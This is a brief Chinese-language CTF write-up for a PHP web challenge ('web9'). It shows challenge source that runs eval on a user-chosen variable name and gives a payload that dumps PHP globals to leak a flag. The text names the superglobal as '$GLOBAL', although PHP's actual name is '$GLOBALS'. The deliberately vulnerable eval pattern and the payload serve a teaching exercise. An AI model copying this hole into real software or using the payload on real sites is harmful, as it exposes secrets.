# web9 - PHP超全局变量$GLOBAL

PHP有个超全局变量$GLOBAL

payload: `?args=GLOBAL`

题目源码：
```php
<?php  

error_reporting(0);
include "flag1.php";
highlight_file(__file__);

if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");  // $$args是名为$args的变量，比如$args='arg2'，那么$$args=$arg2
}

?> 
```